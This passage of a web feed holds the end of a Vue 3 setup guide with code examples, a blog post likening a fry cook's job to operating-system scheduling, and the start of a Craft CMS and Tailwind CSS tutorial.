<span>  </span><span>},</span>
<span>  </span><span>setup</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span>
<span>      </span><span>const</span><span> </span><span>postTitle</span><span> </span><span>=</span><span> </span><span>ref</span><span>(</span><span>'</span><span>postTitle</span><span>'</span><span>)</span><span>;</span>
<span>      </span><span>const</span><span> </span><span>numWordsInTitle</span><span> </span><span>=</span><span> </span><span>computed</span><span>(</span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>postTitle</span><span>.</span><span>value</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>)</span><span>.</span><span>length)</span><span>;</span>
<span>      </span><span>const</span><span> </span><span>updateTitle</span><span> </span><span>=</span><span> </span><span>(</span><span>newValue</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>postTitle</span><span>.</span><span>value </span><span>=</span><span> </span><span>newValue</span><span>;</span>
<span>  </span>
<span>      </span><span>return</span><span> </span><span>{</span><span> </span><span>postTitle</span><span>,</span><span> </span><span>numWordsInTitle</span><span>,</span><span> </span><span>updateTitle</span><span> </span><span>}</span>
<span>  </span><span>}</span>
<span>}</span><span>)</span><span>;</span></code></pre>
<p>The <code>&lt;template&gt;...&lt;/template&gt;</code> part would be the same as the above. Anything returned from <code>setup()</code>'s object will be available to use in the <code>&lt;template&gt;</code>.</p>
<p>For a very small example of a Vue 3 component which uses <code>setup()</code> and then uses the data returned from that function within <code>&lt;template&gt;</code>, check out <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/src/components/layout/components/Sidebar.vue" target="_blank" rel="noopener">this example component</a></p>
<p>There is much more that can be said about the composition API. But this is just a brief introduction. I have a more <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">in-depth overview of Vue 3's composition API here</a>.</p>
<h3 id="set-up-vue-3-with-sassscss">Set up Vue 3 with Sass/SCSS</h3>
<p>It is very easy to set up Sass with Vue 3, which I always prefer as it makes writing CSS a little nicer.</p>
<p>Basic setup of Sass in Vue 3 is quite easy: <code>yarn add -D sass-loader sass</code>. I have written more about <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-global-scss-sass-variables/">setting up Sass in Vue 3 here (including global config)</a></p>
<h3 id="setting-up-vuex-in-vue-3">Setting up Vuex in Vue 3</h3>
<p>There are some arguments that Vuex will not be needed as often, thanks to the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">composition API in Vue 3</a>. But I think for large applications it will still be a staple part of using Vue.</p>
<p><code>yarn add vuex</code></p>
<p>(I'm using 4.0.0, which works with Vue 3)</p>
<p>In your <code>main.js</code> or <code>main.ts</code> file you will need to set it up like this:</p>
<pre><code><span>import</span><span> </span><span>{</span><span> </span><span>createApp</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span>
<span>import</span><span> </span><span>{</span><span>createStore</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vuex</span><span>'</span>
<span>import</span><span> </span><span>App</span><span> </span><span>from</span><span> </span><span>'</span><span>./App.vue</span><span>'</span><span>;</span><span> </span><span>// Your main component</span>

<span>const</span><span> </span><span>store</span><span> </span><span>=</span><span> </span><span>createStore</span><span>(</span><span>{</span>
<span>    state</span><span>:</span><span> </span><span>{</span>
<span>        posts</span><span>:</span><span> []</span><span>,</span>
<span>    </span><span>},</span>
<span>    getters</span><span>:</span><span> </span><span>{</span>
<span>        </span><span>allPosts</span><span>(</span><span>state</span><span>)</span><span> </span><span>{</span>
<span>            </span><span>return</span><span> </span><span>state</span><span>.</span><span>posts</span>
<span>        </span><span>},</span>
<span>    </span><span>},</span>
<span>    mutations</span><span>:</span><span> </span><span>{},</span>
<span>    actions</span><span>:</span><span> </span><span>{},</span>
<span>    modules</span><span>:</span><span> </span><span>{}</span>
<span>}</span><span>)</span>

<span>createApp</span><span>(</span><span>App</span><span>)</span>
<span>    </span><span>.</span><span>use</span><span>(</span><span>store</span><span>) </span><span>// &lt;&lt; this is important</span>
<span>    </span><span>.</span><span>mount</span><span>(</span><span>'</span><span>#app</span><span>'</span><span>)</span></code></pre>
<p>Once you have your Vue 3 Vuex config set up, you just need to access the store in your Vue 3 components.</p>
<p>One way to do this is via the composition API:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>computed</span><span>,</span><span> </span><span>defineComponent</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>
<span>import</span><span> </span><span>{</span><span>useStore</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>vuex</span><span>"</span><span>;</span>

<span>export</span><span> </span><span>default</span><span> </span><span>defineComponent</span><span>(</span><span>{</span>
<span>  name</span><span>:</span><span> </span><span>'</span><span>SinglePost</span><span>'</span><span>,</span>
<span>  components</span><span>:</span><span> </span><span>{},</span>
<span>  </span><span>setup</span><span>()</span><span> </span><span>{</span>
<span>    </span><span>const</span><span> </span><span>store</span><span> </span><span>=</span><span> </span><span>useStore</span><span>()</span><span>;</span>
<span>    </span><span>const</span><span> </span><span>post</span><span> </span><span>=</span><span> </span><span>computed</span><span>(</span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>store</span><span>.</span><span>getters</span><span>.</span><span>allPosts</span><span>.</span><span>find</span><span>(</span><span>(</span><span>post</span><span>:</span><span>any</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>post</span><span>.</span><span>slug</span><span> </span><span>===</span><span> </span><span>route</span><span>.</span><span>params</span><span>.</span><span>slug</span><span>))</span>

<span>    </span><span>return</span><span> </span><span>{</span>
<span>      </span><span>post</span><span>,</span>
<span>    </span><span>}</span>
<span>  </span><span>},</span>
<span>}</span><span>)</span><span>;</span></code></pre>
<p>For a more in-depth example of <strong>how to use Vuex 4 in Vue 3</strong>, I recommend <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">looking at the sample Vue 3 boilerplate app, which includes Vue 3 and Vuex config</a>.</p>
<h3 id="setting-up-vue-router-in-vue-3">Setting up Vue Router in Vue 3</h3>
<p>Vue router works well with Vue 3. To get started you must install it with: <code>yarn add vue-router</code></p>
<p>Then update your <code>main.ts</code> or <code>main.js</code> to something like this:</p>
<pre><code><span>import</span><span> </span><span>{</span><span> </span><span>createApp</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span>
<span>import</span><span> </span><span>App</span><span> </span><span>from</span><span> </span><span>'</span><span>./App.vue</span><span>'</span>
<span>import</span><span> </span><span>{</span><span> </span><span>createRouter</span><span>,</span><span> </span><span>createWebHashHistory</span><span>,</span><span> </span><span>RouteRecordRaw</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue-router</span><span>'</span>
<span>import</span><span> </span><span>BlogIndex</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/views/BlogIndex.vue</span><span>"</span><span>;</span>

<span>const</span><span> </span><span>routes</span><span>:</span><span> </span><span>Array</span><span>&lt;</span><span>RouteRecordRaw</span><span>&gt;</span><span> </span><span>=</span><span> [</span>
<span>  </span><span>{</span>
<span>    path</span><span>:</span><span> </span><span>'</span><span>/</span><span>'</span><span>,</span>
<span>    name</span><span>:</span><span> </span><span>'</span><span>blog.index</span><span>'</span><span>,</span>
<span>    component</span><span>:</span><span> </span><span>BlogIndex</span><span>,</span><span> </span><span>// without webpack code splitting</span>
<span>  </span><span>},</span>
<span>  </span><span>{</span>
<span>    path</span><span>:</span><span> </span><span>'</span><span>/post/:slug</span><span>'</span><span>,</span>
<span>    name</span><span>:</span><span> </span><span>'</span><span>blog.show</span><span>'</span><span>,</span>
<span>    </span><span>// with webpack code splitting (best for larger apps, it can lazy load then):</span>
<span>    </span><span>component</span><span>:</span><span> </span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>import</span><span>(</span><span>/* webpackChunkName: "blog-show" */</span><span> </span><span>'</span><span>../components/blog/views/SinglePost.vue</span><span>'</span><span>)</span>
<span>  </span><span>},</span>
<span>]</span>

<span>const</span><span> </span><span>router</span><span> </span><span>=</span><span> </span><span>createRouter</span><span>(</span><span>{</span>
<span>  history</span><span>:</span><span> </span><span>createWebHashHistory</span><span>()</span><span>,</span>
<span>  </span><span>routes</span>
<span>}</span><span>)</span>

<span>createApp</span><span>(</span><span>App</span><span>)</span>
<span>    </span><span>.</span><span>use</span><span>(</span><span>router</span><span>) </span><span>// &lt;&lt; important!</span>
<span>    </span><span>.</span><span>mount</span><span>(</span><span>'</span><span>#app</span><span>'</span><span>)</span></code></pre>
<p>For a full example of <strong>using vue router in Vue 3</strong>, I recommend <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">looking at the sample Vue 3 boilerplate app, which includes Vue 3 and vue router</a>.</p>
<h3 id="testing-in-vue-3-with-vue-test-utils">Testing in Vue 3 with Vue Test Utils</h3>
<p>Testing in Vue 3 with Vue Test Utils is largely similar as it was in Vue 2.</p>
<p>Here is an example of a Vue Test Utils test (using Jest) for a component in Vue 3 which uses <code>&lt;router-link&gt;</code> (Vue Router).</p>
<pre><code><span>import</span><span> </span><span>{</span><span>mount</span><span>,</span><span> </span><span>RouterLinkStub</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>@vue/test-utils</span><span>"</span><span>;</span>
<span>import</span><span> </span><span>{</span><span>postFactory</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/model/Post</span><span>"</span><span>;</span>
<span>import</span><span> </span><span>YourComponent</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/components/YourComponent.vue</span><span>"</span><span>;</span>

<span>it</span><span>(</span><span>'</span><span>emits "deletePost"</span><span>'</span><span>,</span><span> </span><span>emitsDeletePost</span><span>)</span><span>;</span>

<span>function</span><span> </span><span>emitsDeletePost</span><span>()</span><span>:</span><span> </span><span>void</span><span> </span><span>{</span>
<span>    </span><span>const</span><span> </span><span>post</span><span> </span><span>=</span><span> </span><span>{</span><span>slug</span><span>:</span><span> </span><span>'</span><span>example-slug</span><span>'</span><span>};</span>

<span>    </span><span>const</span><span> </span><span>$router</span><span> </span><span>=</span><span> </span><span>{</span>
<span>        push</span><span>:</span><span> </span><span>jest</span><span>.</span><span>fn</span><span>()</span>
<span>    </span><span>}</span>
<span>    </span><span>const</span><span> </span><span>$route</span><span> </span><span>=</span><span> </span><span>{</span>
<span>        params</span><span>:</span><span> </span><span>{</span>
<span>            id</span><span>:</span><span> </span><span>1</span>
<span>        </span><span>}</span>
<span>    </span><span>}</span>

<span>    </span><span>const</span><span> </span><span>wrapper</span><span> </span><span>=</span><span> </span><span>mount</span><span>(</span><span>YourComponent</span><span>,</span><span> </span><span>{</span>
<span>        props</span><span>:</span><span> </span><span>{</span><span>post</span><span>},</span>
<span>        global</span><span>:</span><span> </span><span>{</span>
<span>            components</span><span>:</span><span> </span><span>{</span>
<span>                RouterLink</span><span>:</span><span> </span><span>RouterLinkStub</span>
<span>            </span><span>},</span>
<span>            mocks</span><span>:</span><span> </span><span>{</span><span>$route</span><span>,</span><span> </span><span>$router</span><span>}</span>
<span>        </span><span>}</span>
<span>    </span><span>}</span><span>)</span>

<span>    </span><span>const</span><span> </span><span>button</span><span> </span><span>=</span><span> </span><span>wrapper</span><span>.</span><span>get</span><span>(</span><span>'</span><span>button</span><span>'</span><span>)</span><span>;</span>
<span>    </span><span>button</span><span>.</span><span>trigger</span><span>(</span><span>'</span><span>click</span><span>'</span><span>)</span><span>;</span>

<span>    </span><span>expect</span><span>(</span><span>wrapper</span><span>.</span><span>emitted</span><span>(</span><span>'</span><span>deletePost</span><span>'</span><span>))</span><span>.</span><span>toEqual</span><span>([[</span><span>post</span><span>.</span><span>slug</span><span>]])</span>
<span>}</span></code></pre>
<h3 id="using-typescript-in-vue-3">Using Typescript in Vue 3</h3>
<p>Vue 3 fully supports Typescript. The fact that it works so well now with Typescript is one of my favourite new things about Vue 3. It was always a bit hard to get everything typed correctly in Vue 2. </p>
<p>It is still possible to use plain Javascript with Vue 3, if you are not keen on Typescript.</p>
<p><strong>This section of my Vue 3 guide explains how to install and set up Typescript with a Vue 3 installation.</strong></p>
<p>For the configuration to set up Typescript in Vue 3 I would recommend looking <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/tsconfig.json" target="_blank" rel="noopener">at this tsconfig.json</a>. </p>
<p>There are some packages which will need to be installed.</p>
<p>If you originally set up Vue via the Vue CLI and are adding Typescript manually then run <code>yarn add -D @vue/cli-plugin-typescript</code>.</p>
<p>For custom setups you will need <code>yarn add -D typescript vue-loader</code> (check out package.json in that repo). </p>
<p>You will also need to update or create your <code>webpack.config.js</code> config file. The important lines are marked below with <code>&lt;&lt;</code>.</p>
<pre><code><span>const</span><span> </span><span>path</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>path</span><span>'</span><span>)</span>
<span>const</span><span> </span><span>{</span><span> </span><span>VueLoaderPlugin</span><span> </span><span>}</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>vue-loader</span><span>'</span><span>)</span><span>;</span><span> </span><span>// &lt;&lt;</span>

<span>module</span><span>.</span><span>exports</span><span> </span><span>=</span><span> </span><span>{</span>
<span>  entry</span><span>:</span><span> </span><span>'</span><span>./src/main.ts</span><span>'</span><span>,</span>
<span>  plugins</span><span>:</span><span> [</span>
<span>    </span><span>new</span><span> </span><span>VueLoaderPlugin</span><span>() </span><span>// &lt;&lt;</span>
<span>  ]</span><span>,</span>
<span>  output</span><span>:</span><span> </span><span>{</span>
<span>    path</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(__dirname</span><span>,</span><span> </span><span>'</span><span>./dist</span><span>'</span><span>)</span><span>,</span>
<span>  </span><span>},</span>
<span>  module</span><span>:</span><span> </span><span>{</span>
<span>    rules</span><span>:</span><span> [</span>
<span>      </span><span>{</span>
<span>        test</span><span>:</span><span> </span><span>/\.</span><span>vue</span><span>$</span><span>/</span><span>,</span>
<span>        loader</span><span>:</span><span> </span><span>'</span><span>vue-loader</span><span>'</span><span> </span><span>// &lt;&lt;</span>
<span>      </span><span>}</span>
<span>    ]</span>
<span>  </span><span>}</span>
<span>}</span></code></pre>
<p>Once set up, all you have to do is change <code>&lt;script&gt;</code> to <code>&lt;script lang="ts"&gt;</code> in your <code>.vue</code> files.</p>
<p>You can also find more information on <a href="https://webdevetc.com/programming-tricks/typescript/webpack/guide-to-typescript-config-for-webpack/">setting up Typescript with Webpack here</a>.</p>
</div></div>]]>
            </description>
            <link>https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084928</guid>
            <pubDate>Fri, 13 Nov 2020 17:34:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Double fetches, scheduling algorithms, and onion rings]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25084909">thread link</a>) | @markmossberg
<br/>
November 13, 2020 | https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/ | <a href="https://web.archive.org/web/*/https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Most people thought I was crazy for doing this, but I spent the last few months of my gap year working as a short order cook at a family-owned fast-food restaurant. (More on this <a href="https://offlinemark.com/2020/11/12/gap-year-restaurant/">here</a>.) I’m a programmer by trade, so I enjoyed thinking about the restaurant’s systems from a programmer’s point of view. Here’s some thoughts about two such systems.</p>



<h2>Double, triple, and even quadruple fetching</h2>



<p>Human systems, at first glance, can appear broken, but due to subtle human factors, they might actually work just fine.</p>



<p>My best example is the system for taking and fulfilling orders. We never wrote anything down, and would re-ask orders multiples times, including when ringing customers up. (In computer security, this is known as a <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch/">double fetch</a>.) Not great service and can theoretically let customers lie and pay less. </p>



<p>In practice most customers didn’t mind <em>too</em> much, liars are rare, and we can loosely detect when something seems off with an order.</p>



<p>Writing orders down and asking strictly once seems optimal but has subtle flaws. For one thing, there’s not enough space behind the counter for everyone to walk to the written order, so it requires more internal communication. This will fail during a rush when you’re blocked on order details and coworkers are too busy for questions. <strong>Customers are always idle; coworkers aren’t</strong>.</p>



<p>It can increase confusion if order slips aren’t thrown out when orders are finished and is also logistically (and literally) messy if you have greasy gloves and want to avoid touching a pen, then food. Lastly, many of my coworkers were older and very used to the existing system. <strong>A major transition to a new system would have generated more confusion than it’s worth</strong>.</p>



<h2>Scheduling algorithms for the fry cook</h2>



<p>While I covered a range of duties including the cash register, milkshake machine, and grill, I spent the most time on the deep fryer. I’m delighted to present this overanalysis of life as a fry cook, from a programmer’s point of view.</p>



<p>This is what deep fryers look like (<a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fwww.nachi.org%2Fdeep-fryer-inspection.htm&amp;psig=AOvVaw1D90dsceyn1wmU-KOGAEuy&amp;ust=1605391502547000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCNCq-sPDgO0CFQAAAAAdAAAAABAE">source</a>):</p>



<div><figure><img loading="lazy" src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;ssl=1" alt="Deep Fryer" width="360" height="352" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>This picture has 2 fryers, each with 2 baskets that can be submerged to sit in the vats of hot oil below. At work, only 1 fryer would be active on any given day which effectively allows 2 items to be fried at the same time.</p>



<p><strong>Fry cooks have a lot in common with operating systems in that they are both responsible for scheduling</strong>. Operating systems schedule threads to run on a limited number of cores; fry cooks schedule food to be fried in a limited number of fryers. Different food items have different priorities, and different lengths of time to cook.</p>



<p>French fries, curly fries, and onion rings (collectively, “fries”) are the main menu items from the deep fryer. Each fry order could be large or small (except for rings which were only large) and eat-in or to-go. The job of the fry cook is to:</p>



<ul><li>Accept fry orders from the greeter.</li><li>Allocate portions of fries from the big bags of raw fries</li><li>Cook them in the fryers</li><li>Put them into the appropriate eat-in/to-go container</li><li>Serve them onto the customer’s tray on the counter, or their to-go bag</li></ul>



<p>The goal is to do this with maximum speed and accuracy and without dropping orders. You’ll ideally minimize the number of times you ask customers and coworkers for order details. In addition, there are a few sources of complexity to handle:</p>



<ul><li><strong>Incomplete information</strong>: Depending on the greeter, they may forget to specify if it’s eat-in or to-go. You can always ask the customer, but the grill chef will likely ask the same question in a little bit. You might be able to save a customer ask if you can eavesdrop on that interaction.</li><li><strong>Timing requirements</strong>: You need to finish orders by the time the grill chef finishes the burgers/hot dogs, but you shouldn’t finish too early. If you put the fries on the counter way before the burgers are ready, they’ll get cold. This matters less for to-go orders, which you can serve into the bag immediately.</li><li><strong>Scale</strong>: During a rush, you might receive many orders per minute, while only being able to process 1-2 per minute. Once the greeter relays the order, they forget it, so it’s up to you to remember. And remember: no writing things down.</li><li><span><strong>Waste avoidance</strong>: </span>Sometimes you or another cook will make too many fries. To avoid wasting them, you can use the excess towards a future order by refreshing them with a splash later and adding them to a fresh batch.</li><li><strong>Changing orders</strong>: Customers sometimes change their order after you’ve started cooking (e.g. regular fry to curly fry). Now you have to figure out what to do with the partially cooked portion currently in the fryer.</li><li><strong>Miscellaneous items</strong>: In addition to fries, there other items that need to be scheduled for time in the fryer, including chicken patties, bacon, clam strips, and fish fillets. </li></ul>



<p>A few techniques to manage all this:</p>



<ul><li><strong>Batching orders together</strong>. If a large and small fry order are in the queue, you can cook them in the same basket at the same time.<ul><li>Some customers request their fries “well done”, meaning cooked extra long. This makes batching more complicated.</li></ul></li><li><strong>“Wait n Splash”</strong>: If a fry order is done cooking far before the rest of the grill items and you don’t have pressing items that need fryer time, you can raise the basket from the oil, but leave the food in it. When the grill items finish, you can quickly splash the food back in the oil to refresh it, then serve it. This will prevent it from getting cold on the counter.</li><li><strong>Inactive fryer baskets</strong>: It can be handy to have extra storage space for cooked food. If you have a “wait n splash” order waiting, but you have more orders to fry, you can use the 2 spare baskets from the inactive fryer to store the waiting order and free up the fryer slot. This is also useful when customers change their order and you need to quickly stash the half cooked portion somewhere and start the adjusted order.</li><li><strong>“The tong dip”</strong>: If both fryers are in use and the grill chef hands you bacon to be urgently cooked, you can hold the bacon in tongs and dip it into one of the submerged baskets. This lets you effectively cook more than 2 things at the same time.</li></ul>



<p>Here’s the system I ended up using. When a new order came in, I’d stop whatever I was doing and grab the appropriate container and place it in the corresponding fry bucket. This captures all 3 pieces of information about the order (fry type, size, to-go?) letting me forget it. If I strictly follow this, I can just process the containers in the buckets like a queue. However, I still need to keep a sense of order memorized because the system doesn’t capture global ordering – if I have containers in the fry, curly fry, and onion ring buckets, I can’t tell which order came in first.</p>



<p>I don’t have a solution for this. On a super busy day, this system falls apart and I drop orders. Extreme load like that has only happened a few times and in that case, I just make large batches, forget about syncing up with the grill items, and hope I don’t have too much excess at the end. Generally, the system worked nicely.</p>



<h2>Conclusion</h2>



<p>It’s fun to think about human systems, like those in a restaurant, from a programmer’s point of view. A fry cook’s job closely resembles that of an operating system scheduler, complete with optimization points and edge cases. One can try to optimize human systems as if they were computer systems, but it’s critical to understand the subtle human aspects of the system when evaluating improvements.</p>



<div><div>
<div><div>
<div><div>
<hr>



<h3>Learn something new? Let me know!</h3>



<p>Did you learn something from this post? I’d love to hear what it was — tweet me <a href="https://twitter.com/offlinemark">@offlinemark</a>! </p>



<p>I also have a mailing list if you want to know when I write new posts:</p>






<hr>
</div></div>
</div></div>
</div></div>
					</div></div>]]>
            </description>
            <link>https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084909</guid>
            <pubDate>Fri, 13 Nov 2020 17:33:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Style Board Game Cards with Tailwind CSS – Craft CMS Tutorial]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25084784">thread link</a>) | @alexaguilar18
<br/>
November 13, 2020 | https://www.eaglepeakweb.com/blog/style-board-game-cards-tailwind-css-craft-cms-tutorial | <a href="https://web.archive.org/web/*/https://www.eaglepeakweb.com/blog/style-board-game-cards-tailwind-css-craft-cms-tutorial">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-wow-duration="0.7s" data-wow-delay="0.2s" data-wow-offset="50">
              <p>In the previous lessons, we <a href="https://www.eaglepeakweb.com/blog/create-board-games-section-craft-cms-tutorial">created</a> the <span>Board Games</span> section and then <a href="https://www.eaglepeakweb.com/blog/import-board-game-data-into-craft-cms-feed-me-tutorial">imported</a> our favorite board games using the FeedMe plugin. So far we’ve only worked in the Craft admin panel, that changes today when we update the homepage <a href="https://twig.symfony.com/">Twig</a> template to display our board games &amp; style it with <a href="https://tailwindcss.com/">Tailwind CSS</a>.</p>
<h2 id="mockup-of-board-games-row">Mockup of Board Games row <a href="#mockup-of-board-games-row" title="Mockup of Board Games row">#</a></h2>
<p>Here’s a screenshot of a board game row displaying 3 cards.</p>
<p><img src="https://cdn.eaglepeakweb.com/img/projects/blog/board-game-row-mockup.jpg?mtime=20201111114704&amp;focal=none" alt=""></p>
<div><p>💡 Check it out on the <a href="https://play.tailwindcss.com/OoHAM2CdZh">Tailwind Play</a> playground.</p></div>
<h2 id="update-homepage-to-list-board-game-titles">Update Homepage to list board game titles <a href="#update-homepage-to-list-board-game-titles" title="Update Homepage to list board game titles">#</a></h2>
<p>Before setting up Tailwind, let’s get familiar with updating the homepage.  We’ll modify the default <code>index.twig</code> template to list our board game titles.</p>
<ol>
<li>Open <code>templates/index.twig</code> in your favorite code editor.<sup id="fnref:1"><a href="#fn:1">1</a></sup></li>
<li>Scroll down until you find the H2 with “Popular Resources” and replace it with “Favorite Board Games”.</li>
<li><p>We’re going to grab ALL or our board game data and put into a variable <span>boardgames</span>.
Copy &amp; paste the snippet below, put it right above the H2.</p>
<pre><code> {% set boardgames = craft.entries.section('boardGames').all() %}
</code></pre>
</li>
<li><p>Replace all the <code>&lt;li&gt;</code> rows with the following. </p>
<pre><code> {% for boardgame in boardgames %}
   {% set image = boardgame.boardGameImage.one() %}
   &lt;li&gt;
     &lt;a href="{{image.getUrl}}" target="_blank"&gt;{{ boardgame.title }}&lt;/a&gt;&lt;br&gt;
     &lt;small&gt;{{ boardgame.boardGameCategory.one()}}&lt;/small&gt;
   &lt;/li&gt;
 {% endfor %}
</code></pre>
</li>
</ol>
<div><p>💡 You can look up the field <em>handles</em>  in <a href="https://cdn.eaglepeakweb.com/img/projects/blog/board-game-field-handles.png?mtime=20201022131442&amp;focal=none">Settings&gt; Fields</a>.</p></div>
<p>Visit the homepage and you’ll see a list of board games like this:</p>
<p><img src="https://cdn.eaglepeakweb.com/img/projects/blog/default-index-boardgames.jpg?mtime=20201111131817&amp;focal=none" alt="https://cdn.eaglepeakweb.com/img/projects/blog/First-board-game-created.jpg?mtime=20200917134817&amp;focal=none"></p>
<p>So we’re looping through each individual <span>boardgame</span> and</p>
<ul>
<li>Displaying the Title   </li>
<li>Linking the Title to the board game’s cover image   </li>
<li>Displaying the Category below the Title   </li>
</ul>
<p>Notice that Twig has 2 types of curly braces.  </p>
<ol>
<li><p><code>{{ }}</code> <em>print this</em></p>
</li>
<li><p><code>{% %}</code> <em>do this</em> <small>like set a variable, start a loop or check a condition</small></p>
</li>
</ol>
<p>Also notice the .<code>one()</code> method for the image &amp; category.  Since a board game could have multiple images or categories, we only want the first value.</p>
<h2 id="simple-tailwind-css-setup">Simple Tailwind CSS Setup <a href="#simple-tailwind-css-setup" title="Simple Tailwind CSS Setup">#</a></h2>
<p>You could easily spend half a day setting up a front-end build chain with Gulp, webpack, etc.  So our setup is deliberately “simple” 🤔 to get us going.<sup id="fnref:2"><a href="#fn:2">2</a></sup> </p>
<h3 id="node.js">Node.js <a href="#node.js" title="Node.js">#</a></h3>
<p>You’ll need to have Node.js installed locally.  So go to the <a href="https://nodejs.org/">Node.js</a> homepage &amp; download the LTS version for your OS.</p>
<h3 id="lando---con-fig-ure-fron-t-end-tool-ing">Lando - con­fig­ure fron­t-end tool­ing <a href="#lando---con-fig-ure-fron-t-end-tool-ing" title="Lando - con­fig­ure fron­t-end tool­ing">#</a></h3>
<p>If you’re using <a href="https://www.eaglepeakweb.com/blog/install-craft-cms-3-lando-docker">Lando for local development</a>, then you can add front-end tooling by updating <code>.lando.yml</code> </p>
<pre><code>name: boardgames
recipe: lamp
config:
  webroot: web
  php: '7.4'
  database: mariadb:10.3
services:
  database:
    type: mariadb:10.3
    portforward: 3310
    creds:
      user: homestead
      password: secret
      database: boardgames
  node:
    type: node
    build:
      - npm install tailwindcss
      - npm install laravel-mix
tooling:
  npm:
    service: node
  npx:
    service: node
  node:
    service: node
</code></pre>
<p>We’ve added Node.js in a new container to our project. And we’re also installing the tailwindcss &amp; laravel-mix packages. </p>
<p>You’ll then rebuild your Lando containers.
<code>lando rebuild</code></p>
<pre><code>alexagui@alexMBP ~/Code/craft/boardgames (develop/tailwind-homepage) $ lando rebuild
? Are you sure you want to rebuild? (y/N)Yes
Rising anew like a fire phoenix from the ashes! Rebuilding app...
Killing boardgames_appserver_1 ... done
Killing boardgames_database_1  ... done
Going to remove boardgames_appserver_1, boardgames_database_1
Removing boardgames_appserver_1 ... done
Removing boardgames_database_1  ... done
Pulling appserver ... extracting (0.3%)
Pulling node      ... downloading (55.6%)
Pulling database  ... done
</code></pre>
<h3 id="install-tailwind">Install Tailwind <a href="#install-tailwind" title="Install Tailwind">#</a></h3>
<p>💡 If you’re not using Lando then just omit <span>lando</span> from the commands below .</p>
<ol>
<li>lando npm init -y <br>
This will create a <code>package.json</code> file in your project root.</li>
<li><p>lando npx tailwindcss init</p>
<pre><code>alexagui@alexMBP ~/Code/craft/boardgames (develop/tailwind-homepage) $ lando npx tailwindcss init

tailwindcss 1.9.5

✅ Created Tailwind config file: tailwind.config.js
</code></pre>
</li>
<li><p>We’re going to use Laravel Mix to compile our CSS. If you’re using Lando then it should already be installed when we updated <code>.lando.yml</code> above &amp; rebuilt the containers.  If you’re not using Lando then you need to install Laravel Mix <code>npm install laravel-mix</code></p>
</li>
<li><p>Next we setup our <em>source</em> CSS file.  Let’s create it under a new folder <span>source/css/app.css<span> <br>
 <code>mkdir -p source/css &amp;&amp; touch $_/app.css</code></span></span></p>
</li>
<li><p>Put the following inside app.css</p>
<pre><code>@tailwind base;
@tailwind components;
@tailwind utilities;
</code></pre>
</li>
<li><p>Next, in the project root, we create a webpack.mix.js and put the following in it.</p>
<pre><code>const mix = require('laravel-mix');
const tailwindcss = require('tailwindcss');
mix.postCss('source/css/app.css', 'web/css/app.css', [
     tailwindcss('tailwind.config.js')
 ]
);
</code></pre>
</li>
<li><p>Modify package.json by replacing the “scripts” section with this:</p>
<pre><code>"scripts": {
 "dev": "npm run development",
 "development": "NODE_ENV=development node_modules/webpack/bin/webpack.js --progress --hide-modules --config=node_modules/laravel-mix/setup/webpack.config.js",
 "watch": "npm run development -- --watch",
 "watch-poll": "npm run watch -- --watch-poll",
